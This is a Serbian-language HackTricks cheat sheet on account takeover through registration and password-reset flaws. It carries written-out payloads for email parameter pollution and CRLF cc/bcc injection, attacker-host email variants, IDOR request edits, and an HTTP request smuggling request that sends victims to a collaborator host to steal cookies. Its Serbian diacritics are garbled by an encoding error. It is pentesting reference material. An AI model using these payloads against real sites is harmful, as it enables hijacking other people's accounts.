# Registracija i ranjivosti preuzimanja

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Preuzimanje registracije

### Dupliranje registracije

* Poku코ajte generisati koriste캖i postoje캖e korisni캜ko ime
* Proverite variranje e-po코te:
* velika slova
* \+1@
* dodajte ta캜ku u e-po코tu
* posebni karakteri u imenu e-po코te (%00, %09, %20)
* Stavite crne karaktere posle e-po코te: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Enumeracija korisni캜kog imena

Proverite da li mo쬰te saznati kada je korisni캜ko ime ve캖 registrovano unutar aplikacije.

### Politika lozinke

Prilikom kreiranja korisnika proverite politiku lozinke (proverite da li mo쬰te koristiti slabe lozinke).\
U tom slu캜aju mo쬰te poku코ati napasti lozinke metodom brute force.

### SQL Injection

[**Proverite ovu stranicu** ](sql-injection/#insert-statement)da biste nau캜ili kako poku코ati preuzeti naloge ili izvu캖i informacije putem **SQL Injection**-a u registracionim formama.

### Preuzimanje Oauth-a

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML ranjivosti

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Promena e-po코te

Kada se registrujete, poku코ajte promeniti e-po코tu i proverite da li se ova promena pravilno validira ili mo쬰te promeniti na proizvoljne e-po코te.

### Dodatne provere

* Proverite da li mo쬰te koristiti **privremene e-po코te**
* **Duga캜ka** **lozinka** (>200) dovodi do **DoS**-a
* **Proverite ograni캜enja brzine pri kreiranju naloga**
* Koristite username@**burp\_collab**.net i analizirajte **callback**
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR na API parametrima <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Napada캜 se mora prijaviti sa svojim nalogom i oti캖i na funkcionalnost **Promena lozinke**.
2. Pokrenite Burp Suite i presretnite zahtev.
3. Po코aljite ga na karticu "repeater" i izmenite parametre: ID korisnika/e-po코ta\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Slab token za resetovanje lozinke <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token za resetovanje lozinke treba da bude nasumi캜no generisan i jedinstven svaki put.\
Poku코ajte da utvrdite da li token isti캜e ili je uvek isti, u nekim slu캜ajevima algoritam generisanja je slab i mo쬰 se pogoditi. Slede캖e promenljive mogu biti kori코캖ene od strane algoritma.

* Vremenska oznaka
* ID korisnika
* E-po코ta korisnika
* Ime i prezime
* Datum ro캠enja
* Kriptografija
* Samo brojevi
* Mala sekvencija tokena (karakteri izme캠u \[A-Z,a-z,0-9])
* Ponovna upotreba tokena
* Datum isteka tokena

### Otkrivanje tokena za resetovanje lozinke <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Pokrenite zahtev za resetovanje lozinke koriste캖i API/UI za odre캠enu e-po코tu, na primer: test@mail.com
2. Pregledajte odgovor servera i proverite da li postoji `resetToken`
3. Zatim koristite token u URL-u kao 코to je `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Resetovanje lozinke putem kolizije korisni캜kog imena <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrujte se na sistemu sa korisni캜kim imenom identi캜nim korisni캜kom imenu rtve, ali sa belinama uba캜enim pre i/ili posle korisni캜kog imena, na primer: `"admin "`
2. Zatra쬴te resetovanje lozinke sa zlonamernim korisni캜kim imenom.
3. Koristite token poslat na va코u e-po코tu i resetujte lozinku rtve.
4. Prijavite se na nalog rtve sa novom lozinkom.

Platforma CTFd je bila ranjiva na ovaj napad.\
Vidi: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Preuzimanje naloga putem Cross Site Scripting-a <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Prona캠ite XSS unutar aplikacije ili poddomena ako su kola캜i캖i ograni캜eni na nadre캠enu domenu: `*.domain.com`
2. Otkrijte trenutni **kola캜i캖 sesije**
3. Autentifikujte se kao korisnik koriste캖i kola캜i캖

### Preuzimanje naloga putem HTTP Request Smuggling-a <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Koristite **smuggler** da biste otkrili vrstu HTTP Request Smuggling-a (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Kreirajte zahtev koji 캖e prebrisati `POST / HTTP/1.1` sa slede캖im podacima:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` sa ciljem preusmeravanja rtava na burpcollab i kra캠e njihovih kola캜i캖a\
3\. Kona캜an zahtev mo쬰 izgledati ovako
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone izve코taji o iskori코캖avanju ove gre코ke\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Preuzimanje naloga putem CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Kreirajte payload za CSRF, npr. "HTML formu sa automatskim slanjem za promenu lozinke"
2. Po코aljite payload

### Preuzimanje naloga putem JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token mo쬰 se koristiti za autentifikaciju korisnika.

* Izmenite JWT sa drugim korisni캜kim ID-em / Email-om
* Proverite da li postoji slab potpis JWT-a

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Reference

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
